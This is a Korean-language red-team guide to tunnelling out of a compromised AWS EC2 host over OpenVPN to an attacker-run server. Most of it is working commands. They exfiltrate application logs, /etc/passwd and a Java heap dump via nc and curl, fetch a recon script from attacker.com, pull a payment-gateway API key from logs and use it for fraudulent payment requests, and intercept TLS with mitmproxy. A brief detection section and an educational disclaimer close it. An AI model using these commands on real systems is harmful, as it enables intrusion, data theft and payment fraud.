# OpenVPN을 이용한 아웃바운드 터널링 가이드

## 목차
1. [공격 시나리오 개요](#1-공격-시나리오-개요)
2. [OpenVPN 서버 구성 (공격자 PC)](#2-openvpn-서버-구성-공격자-pc)
3. [OpenVPN 클라이언트 설치 (침투된 EC2)](#3-openvpn-클라이언트-설치-침투된-ec2)
4. [터널링 및 트래픽 라우팅](#4-터널링-및-트래픽-라우팅)
5. [탈취한 API 키로 PG API 호출](#5-탈취한-api-키로-pg-api-호출)

---

## 1. 공격 시나리오 개요

### 1.1 공격 흐름도

```
┌─────────────────┐
│   공격자 PC     │ (Public IP: 123.45.67.89)
│  OpenVPN Server │
│  (port 1194)    │
└────────┬────────┘
         │ VPN 터널
         │ (tun0)
         ↓
┌─────────────────┐
│  침투된 EC2     │ (Private IP: 10.0.1.50)
│  OpenVPN Client │ (NAT Public: 54.180.123.45)
│  Spring App     │
└────────┬────────┘
         │ NAT Gateway
         ↓
┌─────────────────┐
│  PG API Server  │ (54.239.28.85)
│  HTTPS:443      │
└─────────────────┘
```

### 1.2 공격 목표

1. ✅ EC2 인스턴스에서 NAT Gateway를 통해 외부로 나가는 트래픽 확인
2. ✅ OpenVPN으로 공격자 PC와 침투된 EC2 간 암호화 터널 생성
3. ✅ 애플리케이션 로그/메모리에서 PG API 키 탈취
4. ✅ 탈취한 API 키로 직접 PG API 호출 (공격자 PC 또는 EC2에서)
5. ✅ VPN 터널을 통해 트래픽 모니터링 및 데이터 유출

---

## 2. OpenVPN 서버 구성 (공격자 PC)

### 2.1 OpenVPN 설치 (Ubuntu/Debian 공격자 PC)

```bash
# OpenVPN 및 Easy-RSA 설치
sudo apt update
sudo apt install -y openvpn easy-rsa

# Easy-RSA 디렉토리 생성
make-cadir ~/openvpn-ca
cd ~/openvpn-ca
```

### 2.2 PKI (Public Key Infrastructure) 구성

```bash
# vars 파일 수정
cat > ~/openvpn-ca/vars << 'EOF'
set_var EASYRSA_REQ_COUNTRY    "KR"
set_var EASYRSA_REQ_PROVINCE   "Seoul"
set_var EASYRSA_REQ_CITY       "Seoul"
set_var EASYRSA_REQ_ORG        "AttackerLab"
set_var EASYRSA_REQ_EMAIL      "attacker@example.com"
set_var EASYRSA_REQ_OU         "RedTeam"
set_var EASYRSA_KEY_SIZE       2048
EOF

# PKI 초기화
./easyrsa init-pki

# CA 생성
./easyrsa build-ca nopass
# Enter: AttackerCA

# 서버 인증서 생성
./easyrsa gen-req server nopass
./easyrsa sign-req server server

# Diffie-Hellman 파라미터 생성
./easyrsa gen-dh

# TLS 인증 키 생성
openvpn --genkey --secret pki/ta.key

# 클라이언트 인증서 생성 (침투된 EC2용)
./easyrsa gen-req ec2-client nopass
./easyrsa sign-req client ec2-client
```

### 2.3 OpenVPN 서버 설정

```bash
# 인증서 및 키 파일 복사
sudo cp ~/openvpn-ca/pki/ca.crt /etc/openvpn/server/
sudo cp ~/openvpn-ca/pki/issued/server.crt /etc/openvpn/server/
sudo cp ~/openvpn-ca/pki/private/server.key /etc/openvpn/server/
sudo cp ~/openvpn-ca/pki/dh.pem /etc/openvpn/server/
sudo cp ~/openvpn-ca/pki/ta.key /etc/openvpn/server/

# 서버 설정 파일 생성
sudo tee /etc/openvpn/server/server.conf > /dev/null << 'EOF'
port 1194
proto udp
dev tun

ca ca.crt
cert server.crt
key server.key
dh dh.pem
tls-auth ta.key 0

# VPN 서브넷 (공격자 PC와 EC2 간)
server 10.8.0.0 255.255.255.0

# 라우팅 설정
push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"

# 클라이언트 간 통신 허용
client-to-client

# 연결 유지
keepalive 10 120

# 압축
comp-lzo

# 권한 제한
user nobody
group nogroup

# 로그
status /var/log/openvpn-status.log
log-append /var/log/openvpn.log
verb 3
EOF
```

### 2.4 IP 포워딩 및 방화벽 설정

```bash
# IP 포워딩 활성화
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf

# iptables NAT 설정
sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -s 10.8.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -d 10.8.0.0/24 -j ACCEPT

# iptables 규칙 저장
sudo apt install -y iptables-persistent
sudo netfilter-persistent save

# 방화벽에서 OpenVPN 포트 허용
sudo ufw allow 1194/udp
sudo ufw allow OpenSSH
sudo ufw enable
```

### 2.5 OpenVPN 서버 시작

```bash
# OpenVPN 서버 시작
sudo systemctl start openvpn-server@server
sudo systemctl enable openvpn-server@server

# 상태 확인
sudo systemctl status openvpn-server@server

# 로그 확인
sudo tail -f /var/log/openvpn.log

# VPN 인터페이스 확인
ip addr show tun0
```

---

## 3. OpenVPN 클라이언트 설치 (침투된 EC2)

### 3.1 클라이언트 인증서 파일 준비

**공격자 PC에서 클라이언트 설정 파일 생성:**

```bash
# 클라이언트 설정 파일 생성
cat > ~/ec2-client.ovpn << 'EOF'
client
dev tun
proto udp

# 공격자 PC의 Public IP
remote 123.45.67.89 1194

resolv-retry infinite
nobind
persist-key
persist-tun

# 인증서 (아래에 인라인으로 포함)
remote-cert-tls server
tls-auth ta.key 1

comp-lzo
verb 3

# 인증서 및 키 인라인 포함
<ca>
# ca.crt 내용 복사
</ca>

<cert>
# ec2-client.crt 내용 복사
</cert>

<key>
# ec2-client.key 내용 복사
</key>

<tls-auth>
# ta.key 내용 복사
</tls-auth>
EOF

# 인증서 내용 추가
echo "<ca>" > ~/ec2-client.ovpn
cat ~/openvpn-ca/pki/ca.crt >> ~/ec2-client.ovpn
echo "</ca>" >> ~/ec2-client.ovpn

echo "<cert>" >> ~/ec2-client.ovpn
cat ~/openvpn-ca/pki/issued/ec2-client.crt >> ~/ec2-client.ovpn
echo "</cert>" >> ~/ec2-client.ovpn

echo "<key>" >> ~/ec2-client.ovpn
cat ~/openvpn-ca/pki/private/ec2-client.key >> ~/ec2-client.ovpn
echo "</key>" >> ~/ec2-client.ovpn

echo "<tls-auth>" >> ~/ec2-client.ovpn
cat ~/openvpn-ca/pki/ta.key >> ~/ec2-client.ovpn
echo "</tls-auth>" >> ~/ec2-client.ovpn
```

### 3.2 EC2로 클라이언트 설정 파일 전송

```bash
# 방법 1: SCP (SSH 접근 가능한 경우)
scp ~/ec2-client.ovpn ec2-user@54.180.123.45:/tmp/

# 방법 2: HTTP 서버로 전송 (공격자 PC에서)
cd ~
python3 -m http.server 8000
# EC2에서: wget http://123.45.67.89:8000/ec2-client.ovpn

# 방법 3: Base64 인코딩 후 클립보드 복사
base64 ~/ec2-client.ovpn | xclip -selection clipboard
# EC2에서 Base64 디코딩하여 저장
```

### 3.3 EC2에서 OpenVPN 클라이언트 설치 및 연결

```bash
# OpenVPN 클라이언트 설치 (Amazon Linux 2)
sudo yum install -y epel-release
sudo yum install -y openvpn

# 클라이언트 설정 파일 이동
sudo mv /tmp/ec2-client.ovpn /etc/openvpn/client/

# OpenVPN 연결 (포그라운드 테스트)
sudo openvpn --config /etc/openvpn/client/ec2-client.ovpn

# 성공 메시지 확인:
# Initialization Sequence Completed

# 백그라운드 실행
sudo openvpn --config /etc/openvpn/client/ec2-client.ovpn --daemon

# VPN 연결 확인
ip addr show tun0
# tun0: inet 10.8.0.6/24  <- VPN IP

# 공격자 PC와 통신 테스트
ping -c 3 10.8.0.1  # 공격자 PC의 VPN IP
```

---

## 4. 터널링 및 트래픽 라우팅

### 4.1 VPN 터널을 통한 트래픽 확인

**공격자 PC에서:**

```bash
# VPN 클라이언트 연결 확인
cat /var/log/openvpn-status.log

# 출력 예시:
# ec2-client,10.8.0.6,54.180.123.45:52341,2025-10-31 10:30:15

# VPN 터널 트래픽 모니터링
sudo tcpdump -i tun0 -nn -v

# EC2에서 외부 연결 시도 시 트래픽 캡처
sudo tcpdump -i tun0 -w /tmp/vpn-traffic.pcap
```

**침투된 EC2에서:**

```bash
# VPN 라우팅 테이블 확인
ip route show

# 특정 트래픽을 VPN 터널로 라우팅 (예: PG API)
# PG API IP: 54.239.28.85
sudo ip route add 54.239.28.85/32 via 10.8.0.1 dev tun0

# 또는 모든 트래픽을 VPN으로 (주의!)
# sudo ip route del default
# sudo ip route add default via 10.8.0.1 dev tun0
```

### 4.2 데이터 유출 테스트

**EC2에서 데이터 유출:**

```bash
# 1. 로그 파일 압축
tar -czf /tmp/app-logs.tar.gz /var/log/spring-app/

# 2. VPN 터널을 통해 공격자 PC로 전송
# 공격자 PC에서 리스너 실행: nc -lvp 4444 > app-logs.tar.gz
cat /tmp/app-logs.tar.gz | nc 10.8.0.1 4444

# 3. HTTP로 전송
# 공격자 PC에서: python3 -m uploadserver 8080
curl -X POST -F "file=@/tmp/app-logs.tar.gz" http://10.8.0.1:8080/upload
```

**공격자 PC에서 수신:**

```bash
# Netcat 리스너
nc -lvp 4444 > received-logs.tar.gz

# 또는 간단한 HTTP 업로드 서버
pip3 install uploadserver
python3 -m uploadserver 8080

# 수신된 파일 확인
tar -xzf received-logs.tar.gz
grep -r "test_sk_" ./var/log/spring-app/
```

---

## 5. 탈취한 API 키로 PG API 호출

### 5.1 로그에서 API 키 추출

```bash
# EC2에서 API 키 검색
grep -r "test_sk_" /var/log/spring-app/ | head -1

# 출력 예시:
# 요청 헤더: Authorization: Bearer test_sk_ABCdefGHIjklMNOpqrSTUvwxYZ123456

# API 키 저장
API_KEY="test_sk_ABCdefGHIjklMNOpqrSTUvwxYZ123456"
MERCHANT_ID="MID_hyundai_20251031"
```

### 5.2 공격자 PC에서 직접 PG API 호출

```bash
# PG API 엔드포인트
PG_API_URL="https://api.example-pg.com/v1/payments"

# 결제 승인 요청 (탈취한 API 키 사용)
curl -X POST "$PG_API_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $API_KEY" \
  -H "X-Merchant-ID: $MERCHANT_ID" \
  -d '{
    "merchantId": "'"$MERCHANT_ID"'",
    "orderId": "HACKED_ORDER_12345",
    "amount": 999999,
    "currency": "KRW",
    "paymentMethod": "card",
    "customerName": "Attacker",
    "customerEmail": "attacker@evil.com",
    "cardInfo": {
      "cardNumber": "1234-5678-9012-3456",
      "expiryMonth": "12",
      "expiryYear": "25",
      "cvv": "123"
    }
  }'
```

### 5.3 EC2에서 VPN 터널을 통해 PG API 호출

```bash
# VPN 터널을 통해 공격자 PC로 프록시
# 공격자 PC에서 Burp Suite 또는 mitmproxy 실행

# EC2에서 프록시 설정
export http_proxy=http://10.8.0.1:8080
export https_proxy=http://10.8.0.1:8080

# Spring 애플리케이션의 결제 API 호출
curl -X POST http://localhost:8080/api/payments \
  -H "Content-Type: application/json" \
  -d '{
    "rentalId": "test-rental-123",
    "amount": 50000,
    "currency": "KRW",
    "paymentMethod": "card",
    "customerName": "Test User",
    "customerEmail": "test@example.com"
  }'

# 공격자 PC의 프록시에서 PG API 요청/응답 캡처
```

---

## 6. 트래픽 분석 및 모니터링

### 6.1 Wireshark로 VPN 트래픽 분석

**공격자 PC에서:**

```bash
# 패킷 캡처
sudo tcpdump -i tun0 -w /tmp/vpn-capture.pcap -s 0

# Wireshark로 열기
wireshark /tmp/vpn-capture.pcap

# 필터:
# - http.request.method == "POST"
# - ssl.handshake.type == 1
# - ip.dst == 54.239.28.85
```

### 6.2 SSL/TLS 복호화 (중간자 공격)

**mitmproxy 설치 및 실행 (공격자 PC):**

```bash
# mitmproxy 설치
pip3 install mitmproxy

# 투명 프록시 모드로 실행
mitmproxy --mode transparent --showhost --ssl-insecure

# EC2에서 iptables로 트래픽 리다이렉트
sudo iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 10.8.0.1:8080
```

---

## 7. 공격 탐지 및 대응

### 7.1 VPC Flow Logs에서 이상 징후 탐지

**CloudWatch Logs Insights 쿼리:**

```sql
-- VPN 연결 탐지 (포트 1194 UDP)
fields @timestamp, srcAddr, dstAddr, srcPort, dstPort, protocol
| filter dstPort = 1194 and protocol = 17
| sort @timestamp desc

-- 비정상적인 대용량 아웃바운드 트래픽
fields @timestamp, srcAddr, dstAddr, bytes
| filter srcAddr like "10.0.1."
| stats sum(bytes) as total_bytes by dstAddr
| filter total_bytes > 100000000
| sort total_bytes desc
```

### 7.2 GuardDuty 알람

- **Finding Type**: `UnauthorizedAccess:EC2/TorIPCaller`
- **Finding Type**: `Backdoor:EC2/C&CActivity.B!DNS`
- **Finding Type**: `Exfiltration:EC2/DataExfiltration`

### 7.3 대응 방안

1. **즉시 격리**: Security Group에서 모든 아웃바운드 차단
2. **스냅샷 생성**: 포렌식 분석용
3. **IAM 자격 증명 회전**: 탈취 가능성 있는 모든 키
4. **API 키 무효화**: PG사에 연락하여 긴급 중단
5. **CloudTrail 분석**: 공격자 활동 추적

---

## 8. 실습 시나리오 요약

### 시나리오 1: 정찰 및 VPN 연결

```bash
# 1. EC2 침투 (Spring4Shell 취약점 이용)
# 2. 정찰 스크립트 실행
wget http://attacker.com/attacker-recon.sh
chmod +x attacker-recon.sh
sudo ./attacker-recon.sh

# 3. OpenVPN 클라이언트 설치 및 연결
wget http://attacker.com/ec2-client.ovpn
sudo openvpn --config ec2-client.ovpn --daemon

# 4. API 키 탐색
grep -r "test_sk_" /var/log/spring-app/
```

### 시나리오 2: 데이터 유출

```bash
# 5. 로그 파일 압축
tar -czf /tmp/exfil.tar.gz /var/log/spring-app/ /etc/passwd

# 6. VPN 터널로 전송
cat /tmp/exfil.tar.gz | nc 10.8.0.1 4444

# 7. 메모리 덤프
JAVA_PID=$(pgrep -f java)
sudo jmap -dump:format=b,file=/tmp/heap.bin $JAVA_PID
cat /tmp/heap.bin | nc 10.8.0.1 4445
```

### 시나리오 3: API 키 악용

```bash
# 8. 탈취한 API 키로 불법 결제 요청
API_KEY="test_sk_ABCdefGHIjklMNOpqrSTUvwxYZ123456"
curl -X POST https://api.example-pg.com/v1/payments \
  -H "Authorization: Bearer $API_KEY" \
  -d '{ "amount": 1000000, "orderId": "FRAUD_001" }'
```

---

**경고**: 이 문서는 교육 및 보안 연구 목적으로만 작성되었습니다. 무단으로 타인의 시스템에 침투하거나 데이터를 유출하는 행위는 불법입니다.
